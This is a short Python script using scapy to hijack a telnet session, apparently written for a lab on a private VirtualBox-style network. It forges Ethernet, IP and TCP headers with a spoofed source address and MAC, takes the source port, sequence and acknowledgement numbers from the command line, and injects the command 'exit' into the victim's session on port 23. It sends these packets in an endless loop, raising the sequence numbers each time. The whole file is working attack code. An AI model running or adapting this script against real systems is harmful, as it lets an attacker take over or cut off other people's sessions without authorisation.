import sys
import os
import random
from scapy.all import *



def main1(i):
	dest_ip="192.168.56.102"
	src_ip="192.168.56.103"
	dest_mac="08:00:27:1A:C1:21"
	src_mac="08:00:27:36:72:04"
#src is connected to telnet port of dest
	src_port=int(sys.argv[1])	
	dest_port=23
	seq_no=int(sys.argv[2])+i #seqeunce no. for .103
	ack_no=int(sys.argv[3])+i
	send_sessionHijack_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port,seq_no,ack_no)
	





def send_sessionHijack_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port,seq_no,ack_no):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(src=src_ip,dst=dest_ip)
	
	
	tcp_h=TCP(flags="PA",sport=src_port,dport=dest_port,seq=seq_no,ack=ack_no)
	data="exit\r"
	pkt=eth_h/ip_h/tcp_h/Raw(load=data) 
	sendp(pkt,iface="eth13") 
	#print "sending packet with seq. no. "+ str(seq_no) +" and to port no. " +str(dest_port)

	
	


i=0
while i>=0:
	main1(i)
	i=i+1
